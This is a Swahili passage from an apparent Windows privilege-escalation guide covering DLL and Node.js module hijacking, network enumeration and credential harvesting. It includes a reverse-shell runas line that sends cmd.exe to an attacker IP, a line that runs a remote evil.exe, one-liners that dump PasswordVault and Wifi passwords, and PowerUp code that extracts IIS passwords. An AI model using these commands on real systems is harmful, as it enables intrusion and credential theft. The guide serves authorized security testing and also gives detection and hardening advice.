- Tekeleza vulnerable driver blocklist ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ukiwa na **write permissions ndani ya folder iliyopo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na process na **kupandisha privileges**.<sup>[[2]](#references)</sup>

Kagua permissions za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji wa utatuzi wa moduli za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import isiyo na njia kamili kama `require("foo")` na moduli inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hiyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye ruhusa za chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye ruhusa za juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato lengwa, kwa hiyo hali hii huwa **LPE** kila mara target inapotekelezwa kama administrator, kutoka kwenye scheduled task/service wrapper iliyoinuliwa, au kutoka kwenye programu ya desktop yenye ruhusa za juu inayojiwasha kiotomatiki.

Hili hutokea hasa wakati:

- dependency imewekwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya wahusika wengine inaweka `require("foo")` ndani ya `try/catch` na kuendelea baada ya hitilafu
- package iliondolewa kwenye builds za production, ikaachwa wakati wa packaging, au ilishindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya mti wa dependency badala ya kuwa kwenye code kuu ya programu

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na ufunguaji wa mwisho uliofanikiwa chini ya `C:\node_modules`

Miundo muhimu ya kukagua kwenye code katika faili za `.asar` zilizofunguliwa au source za programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina haswa linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa application ya victim. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya modules za hiari zinazokosekana na zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye upendeleo utajaribu kuitatua.

### Mawazo ya ugunduzi na uimarishaji

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/pakiti mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha vitegemezi vyote vya runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine kwa mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa legacy wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Vishiriki

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Angalia kama kuna kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili la hosts

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Iliyofunguliwa

Angalia **huduma zilizozuiwa** kutoka nje.

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote control inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa authentication na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa chini ya akaunti yenye privileges za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni viashiria vya awali tu, ilhali njia ya memory corruption inayohitaji authentication inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubaini backend service; forwarding rule pekee haithibitishi kuwa destination inaweza kufikiwa au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

[Amri zaidi za kuhesabu mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

`root` ya Linux ndani ya WSL haitoi yenyewe haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kutafuta amri ambazo huenda zilirekodi credentials; kupandisha ruhusa bado kunahitaji akaunti halali yenye ruhusa za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Mpangilio wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro ndani ya [diski pepe ya `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza distro halisi na njia ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uchunguzi wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, hiyo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na kusoma registry kwa njia za kawaida hakuthibitishi ikiwa secret hiyo ipo au inaweza kupatikana. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kuvuja kwa credentials.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia kwa watumiaji kiotomatiki**. Mwanzoni, huenda ikaonekana kuwa watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail, kisha browser ziingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii ina maana kwamba **programu yoyote ya Windows inayohitaji credentials kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa kutumia seti ya taarifa za kuingia zilizotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi authentication tokens na passwords za plaintext ndani ya Universal Windows Platform (UWP) `PasswordVault` (inayoonyeshwa pia kama `Web Credentials` katika `vaultcmd`). Eneo hili la hifadhi limetengwa kwa kila session na linaweza kufunguliwa kwa njia asilia bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kudump na kufungua mara moja usernames na passwords zote za plaintext zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche linganifu wa data, inayotumika zaidi ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche linganifu wa funguo za faragha zisilingani. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**Faili za credentials zinazolindwa na nenosiri kuu** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumika mara nyingi kwa kazi za **scripting** na otomatiki, kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kuwa zinaweza kusimbuliwa na mtumiaji yuleyule tu kwenye kompyuta ileile zilipoundwa.

Credential iliyosafirishwa nje inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaelekeza kwenye mojawapo, tafuta saraka halisi ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` huunganisha credential iliyosimbwa kwa mtumiaji na kompyuta iliyoisafirisha](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima iwe na ruhusa halali kwenye service inayolengwa. Kagua paths na ACLs kwanza, bila kuchapisha thamani zilizosimbwa au maandishi wazi wakati wa ukaguzi wa kawaida.

Ili **kusimbua** PS credentials kutoka kwenye faili inayozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye kumbukumbu kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka katika `%APPDATA%\mRemoteNG` na folda ya Documents ya mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kuwa kidokezo cha kitambulisho. Thamani iliyohifadhiwa si nenosiri la DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji wa faili na kama nenosiri kuu maalum lilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji wa jumla.

**Usafirishaji wa profaili za Remote Desktop Plus** unaweza pia kusomeka katika folda za mtumiaji au folda ya pamoja ya usimamizi. Usafirishaji wa zamani wa `profiles.xml` una maingizo ya `Data/Profile` yenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha nenosiri kisicho tupu kuwa kidokezo cha kitambulisho bila kukichapisha au kudhani kuwa ni maandishi ya kawaida: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profaili unaweza kuhusishwa na akaunti na kompyuta iliyoitengeneza, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kukitegemea.

### Sticky Notes

Watu wakati mwingine huhifadhi nywila na taarifa nyingine katika programu za noti zinazonata. Programu ya Sticky Notes ya Microsoft inayosambazwa kama kifurushi kwa kawaida huhifadhi noti katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na muundo wa hifadhi kabla ya kuhitimisha kuwa hakuna noti kwa sababu faili ya SQLite haipo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa noti zilizothibitishwa hivi karibuni. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya hifadhidata, na ujumuishe `plum.sqlite-shm` inapopatikana; faharasa ya kumbukumbu ya pamoja inaweza kujengwa upya, lakini WAL ni sehemu ya hali ya kudumu ya hifadhidata. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Noti yenye jina la akaunti au nenosiri ni kidokezo tu cha kitambulisho: thibitisha akaunti, ruhusa ya ufikiaji, na matumizi ya nenosiri hilo tena kando. Rekodi iliyosimbwa ya password manager pia huhitaji ufunguo wake halisi wa usimbuaji na ufasiri mahususi wa programu kabla ya kuthibitisha kuingia kwa akaunti yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha nywila kutoka AppCmd.exe, lazima uwe Administrator na uiendeshe katika kiwango cha High Integrity.**\
**AppCmd.exe** iko katika folda ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, inawezekana kuwa **vitambulisho** fulani vimesanidiwa na vinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa SYSTEM privileges**, nyingi ziko hatarini kwa **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Support-tool registry credential artifacts

Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya value zinazohusiana na password chini ya funguo zisizobadilika za application registry. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha password tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu registry key](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la value ni kidokezo tu cha kuchunguza: thibitisha toleo lililosakinishwa, data ya value inayoweza kusomwa, muundo wake na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support hadi akaunti ya Windows yenye ruhusa zaidi kunahitaji pia kuthibitisha matumizi tena ya password hiyo na ruhusa za akaunti husika. Usijumuishe ciphertext au password zilizorejeshwa kwenye matokeo ya kawaida ya enumeration.

### Spreadsheets zinazoshirikiwa zenye worksheets zilizolindwa

Ikiwa unashuku workbook inayoweza kusomwa na kushirikiwa ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inaeleza](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa kwa fiche. Kagua faili husika tu ikiwa umeidhinishwa, na epuka kuonyesha siri zinazoweza kuwepo wakati wa enumeration ya jumla. Njia ya `.xlsx` inayoweza kusomwa, worksheet iliyolindwa, au safu wima iliyofichwa peke yake haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina ruhusa za juu zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### CI server iliyohifadhi patches za mabadiliko

CI server inaweza kuhifadhi mabadiliko ya source yaliyowasilishwa chini ya data directory yake hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` huhifadhi mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayoweza kusomwa inaweza kuhifadhi marejeleo yaliyofutwa au kuongezwa ya faili ya credential, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji AES key pamoja na string iliyosimbwa kwa fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa key hutolewa kando. Kagua kwanza majina ya patch zinazoweza kufikiwa, kisha ukague maudhui husika kwa idhini bila kuonyesha siri kwenye matokeo ya kawaida ya enumeration. Njia ya patch, value iliyosimbwa kwa fiche, au rejeleo la key peke yake havithibitishi credential halali au ufikiaji wa ruhusa za juu zaidi. Zuia ufikiaji wa data directory kwa ACL na epuka kuweka siri kwenye commits za mabadiliko ya build.

### Mzunguko maalum wa kubadilisha password ya local administrator

Kibadilisha password kilichotengenezwa ndani kinaweza kuhifadhi password ya local administrator iliyosimbwa kwa fiche kwenye local service huku kikihifadhi credentials za datastore kwenye faili ya `.env` inayoweza kusomwa au karibu na binary ya updater. Kagua scheduled task ya updater, akaunti, ACL za usanidi, listener na ruhusa za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na local user aliye na credentials halali, lakini uthibitishaji peke yake hauthibitishi ruhusa ya kusoma records husika. Ikiwa seed ya usimbaji fiche au key material inapatikana karibu na ciphertext, kagua utaratibu halisi wa utoaji wa key kabla ya kuamini usimbaji fiche huo. Mbinu inayotoa AES key kwa njia ya deterministic kutoka seed iliyo wazi kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohusu usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye local Administrators group kabla ya kuichukulia kama njia ya privilege escalation. Scheduled task, njia ya `.env`, au encrypted blob peke yake havithibitishi masharti hayo. Usijumuishe password au key material kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kusimamia password za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na local datastore maalum; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyejithibitisha anaweza kusoma index maalum.

### Java server plugin archives na matumizi tena ya credentials

Baadhi ya Java server plugins husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Plugin maalum inayoweza kusomwa inaweza kuwa na usanidi au bytecode yenye credential ya service iliyopachikwa. Kagua archive hiyo ikiwa tu umeidhinishwa, na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin peke yake haithibitishi kuwa kuna siri, na password ya service iliyorejeshwa huleta ruhusa za juu zaidi ikiwa tu inatumika pia kwa akaunti yenye ruhusa zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa directory na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za Openfire embedded database

